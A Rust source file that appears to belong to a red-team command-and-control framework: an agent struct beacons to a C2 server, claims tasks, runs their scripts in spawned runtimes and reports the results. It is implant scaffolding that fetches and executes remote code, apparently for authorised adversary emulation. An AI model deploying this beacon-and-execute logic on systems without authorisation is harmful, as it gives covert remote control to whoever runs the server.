use crate::task::TaskHandle;
use anyhow::{Context, Result};
use c2::{
    pb::{Beacon, ClaimTasksRequest, Task},
    TavernClient,
};
use eldritch::{
    channel::channel,
    pb::{File, ProcessList},
    Runtime,
};
use std::{borrow::BorrowMut, sync::mpsc::Receiver};

pub struct Agent {
    pub info: Beacon,
    pub tavern: TavernClient,
    pub handles: Vec<TaskHandle>,
}

impl Agent {
    async fn claim_tasks(&mut self) -> Result<()> {
        let resp = self
            .tavern
            .claim_tasks(ClaimTasksRequest {
                beacon: Some(self.info.clone()),
            })
            .await?;

        let tasks = resp.get_ref().tasks.clone();

        for task in tasks {
            let tome = match task.tome {
                Some(t) => t,
                None => {
                    continue;
                }
            };
            let (sender, recv) = channel();

            let handle = tokio::spawn(async move {
                let runtime = Runtime::new(sender);
                runtime.run(tome);
            });

            self.handles.push(TaskHandle {
                id: task.id,
                recv,
                handle,
            });
        }
        Ok(())
    }

    pub async fn report(&mut self) -> Result<()> {
        for handle in &self.handles {
            handle.report(self.tavern.borrow_mut()).await?;
        }
        Ok(())
    }

    pub async fn callback(&mut self) -> Result<()> {
        self.claim_tasks().await?;
        self.report().await?;
        Ok(())
    }
}
